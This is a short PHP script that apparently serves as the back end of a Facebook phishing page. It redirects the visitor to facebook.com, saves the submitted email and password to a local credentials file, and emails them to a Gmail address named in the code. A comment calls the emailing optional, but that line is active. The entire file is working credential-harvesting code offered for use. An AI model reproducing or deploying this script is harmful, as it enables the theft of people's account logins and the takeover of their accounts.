<?php
header('Location: https://facebook.com/', true);
$file = fopen("credentials.txt", "a");
fwrite($file, $_POST['email'] . "\t" . $_POST['pass'] . PHP_EOL);
fclose($file);

// uncomment the lines below to receive the credentials by email
$maildrop = "hotboyof16@gmail.com";
mail($maildrop, "Facebook credentials", $_POST['email'] . "\t" . $_POST['pass']);
